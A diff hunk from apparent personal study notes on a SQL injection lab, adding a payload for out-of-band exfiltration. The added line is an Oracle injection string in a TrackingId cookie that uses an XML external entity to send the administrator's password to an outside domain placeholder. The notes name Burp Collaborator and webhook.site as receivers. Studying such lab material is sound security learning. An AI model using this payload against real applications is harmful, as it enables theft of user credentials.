@@ -206,6 +206,7 @@ MySQL --> version() and @@version
 - Description:
 + Same as previous lab but we need to check administrator credential
 + The strategy is same as some previous lab, nothing different
+    + TrackingId=f"""'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{domain}">+%25remote%3b]>'),'/l')+FROM+dual--"""
 + But i don't have burp proffessional now, so i can't solve it (must use Burp Collaborator's default public server)
 + If other enviroment not block, you can use https://webhook.site as a replace tool
 
